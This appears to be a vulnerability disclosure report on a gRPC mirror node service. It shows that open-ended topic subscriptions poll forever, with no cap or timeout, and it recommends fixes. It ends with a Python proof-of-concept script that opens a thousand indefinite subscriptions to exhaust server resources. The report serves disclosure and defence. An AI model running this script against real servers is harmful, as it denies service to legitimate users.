### Title
Unbounded Indefinite gRPC Subscription Resource Exhaustion via No-EndTime TopicMessageFilter

### Summary
An unprivileged user can open an arbitrary number of gRPC connections and, on each, issue up to 5 `subscribeTopic` calls with a `startTime` just at or below `DomainUtils.now()` and no `endTime` or `limit`. Because `pastEndTime()` returns `Flux.never()` when `endTime` is null and `PollingTopicListener` repeats `Long.MAX_VALUE` times, each subscription polls the database indefinitely with no server-side termination. There is no global cap on concurrent subscriptions, no subscription timeout, and no rate limit on new connections, allowing an attacker to exhaust file descriptors, the `boundedElastic` thread pool, and the database connection pool.

### Finding Description

**Code path and root cause:**

1. **`TopicMessageFilter` validation** (`grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java`, lines 48–51):
   ```java
   public boolean isValidStartTime() {
       return startTime <= DomainUtils.now();
   }
   ```
   A `startTime` of `DomainUtils.now() - 1` passes. `endTime` is optional (`Long endTime` with no `@NotNull`). `limit` defaults to `0` (no limit).

2. **`PollingTopicListener.listen()`** (`grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java`, lines 38–43):
   ```java
   return Flux.defer(() -> poll(context))
       .delaySubscription(interval, scheduler)
       .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
           .jitter(0.1)
           .withFixedDelay(interval)
           .withScheduler(scheduler))
   ```
   `Long.MAX_VALUE` repetitions with no termination condition. When no messages arrive, the flux emits nothing but keeps repeating every `interval` (default 500 ms) forever.

3. **`TopicMessageServiceImpl.pastEndTime()`** (`grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java`, lines 123–131):
   ```java
   private Flux<Object> pastEndTime(TopicContext topicContext) {
       if (topicContext.getFilter().getEndTime() == null) {
           return Flux.never();
       }
       ...
   }
   ```
   When `endTime` is null, `Flux.never()` is returned, so `takeUntilOther(pastEndTime(...))` never fires. The subscription has no server-side deadline.

4. **`TopicContext.isComplete()`** (`TopicMessageServiceImpl.java`, lines 203–215):
   ```java
   boolean isComplete() {
       if (filter.getEndTime() == null) {
           return false;
       }
       ...
   }
   ```
   Always returns `false` when `endTime` is null, so the safety-check and live-message paths never self-terminate.

5. **No global subscription cap**: `subscriberCount` is a metric gauge only — it is never checked against a maximum. `maxConcurrentCallsPerConnection = 5` (`NettyProperties.java`, line 14) limits calls *per connection*, not globally. An attacker opens N connections × 5 subscriptions each = 5N indefinite subscriptions.

**Exploit flow:**
- Attacker opens N TCP connections to port 5600.
- On each, issues 5 `subscribeTopic` RPCs: `startTime = DomainUtils.now() - 1`, no `endTime`, no `limit`, valid `topicId`.
- Each subscription passes `isValidStartTime()` and `isValidEndTime()`.
- Each subscription enters the `PollingTopicListener` infinite-repeat loop, consuming: one open file descriptor (gRPC/HTTP2 stream), one `boundedElastic` scheduler thread slot per poll cycle, and one database connection per poll.
- No messages arrive (topic is quiet or non-existent with `checkTopicExists=false`), so the subscription never completes.
- With enough N, file descriptors, thread pool slots, and DB connections are exhausted.

### Impact Explanation

Each idle subscription holds OS-level resources (file descriptors for the gRPC stream), JVM thread pool slots from `Schedulers.boundedElastic()`, and database connection pool slots (each 500 ms poll issues a `findByFilter` query). Exhausting file descriptors causes `Too many open files` errors, preventing new connections from any client including legitimate ones. Exhausting the DB connection pool causes all queries to queue or fail. This constitutes a full denial-of-service of the gRPC mirror node service, matching the stated severity of shutting down ≥30% of network processing capacity without brute force.

### Likelihood Explanation

The attack requires no authentication, no special privileges, and no knowledge beyond the public gRPC protobuf API. The only precondition is network access to port 5600. The attack is trivially scriptable: a single attacker machine can open thousands of connections using standard gRPC client libraries. It is repeatable and persistent — subscriptions survive until the server process is restarted or the attacker disconnects. The default `maxConcurrentCallsPerConnection = 5` actually makes the attack more efficient by requiring fewer connections per subscription slot.

### Recommendation

1. **Enforce a maximum subscription duration**: Add a configurable `maxSubscriptionDuration` (e.g., 24 hours) and apply `.timeout(maxSubscriptionDuration)` in `TopicMessageServiceImpl.subscribeTopic()` for subscriptions with no `endTime`.
2. **Enforce a global concurrent subscription cap**: Check `subscriberCount` against a configurable maximum before accepting a new subscription; return `RESOURCE_EXHAUSTED` gRPC status if exceeded.
3. **Enforce a maximum `endTime` horizon**: Require `endTime` to be set, or cap it at `now() + maxFutureWindow`, preventing open-ended subscriptions.
4. **Add rate limiting per client IP** at the gRPC interceptor layer to limit new subscription creation rate.
5. **Bound the repeat count** in `PollingTopicListener` to a finite value tied to a wall-clock deadline rather than `Long.MAX_VALUE`.

### Proof of Concept

```python
import grpc
import time
from concurrent import futures
# proto-generated stubs for ConsensusService
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from com.hedera.hashgraph.sdk.proto import basic_types_pb2

TARGET = "mirror-node-grpc:5600"
NUM_CONNECTIONS = 200
CALLS_PER_CONNECTION = 5  # matches maxConcurrentCallsPerConnection default

channels = []
streams = []

for i in range(NUM_CONNECTIONS):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    channels.append(channel)
    for _ in range(CALLS_PER_CONNECTION):
        req = consensus_service_pb2.ConsensusTopicQuery(
            topicID=basic_types_pb2.TopicID(topicNum=41110),
            # startTime just below now, no endTime, no limit
            consensusStartTime=None,  # defaults to server-side DomainUtils.now()-1
            limit=0
        )
        # Non-blocking streaming call — holds connection open indefinitely
        stream = stub.subscribeTopic(req)
        streams.append(stream)

print(f"Opened {NUM_CONNECTIONS * CALLS_PER_CONNECTION} indefinite subscriptions")
# Server file descriptors, thread pool, and DB connections now exhausted
time.sleep(86400)  # hold open for 24 hours
```
